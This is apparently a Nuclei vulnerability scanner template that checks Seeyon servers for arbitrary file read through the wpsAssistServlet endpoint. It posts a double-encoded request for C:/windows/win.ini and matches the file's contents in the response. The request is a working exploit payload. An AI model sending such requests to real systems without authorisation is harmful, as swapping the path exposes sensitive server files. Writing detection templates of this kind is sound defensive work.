id: seeyon-wpsassist-file-read

info:
  name: Seeyon wpsAssistServlet Arbitrary File Read
  author: local
  severity: high
  description: Detects arbitrary file read through wpsAssistServlet using a harmless Windows file.
  tags: seeyon,zhiyuan,file-read,active

http:
  - method: POST
    path:
      - "{{BaseURL}}/seeyon/wpsAssistServlet"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'flag=template&templateUrl=C%253A%252Fwindows%252Fwin.ini'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'bit app support'
          - 'fonts'
          - 'extensions'
        condition: and

